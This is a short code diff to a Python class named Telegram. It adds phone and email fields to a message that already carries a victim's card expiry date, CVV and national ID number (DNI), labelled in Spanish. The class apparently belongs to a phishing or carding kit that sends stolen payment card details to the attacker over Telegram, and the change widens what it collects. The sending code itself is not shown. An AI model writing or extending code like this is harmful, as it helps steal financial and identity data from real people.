@@ -31,6 +31,8 @@ class Telegram:
             f'CADUCIDAD: {self.Vto}\n'
             f'CVV: {self.CVV}\n'
             f'DNI: {self.dni}\n'
+            f'TELEFONO: {self.phone}\n'
+            f'EMAIL: {self.email}\n'
         )
         return message
 
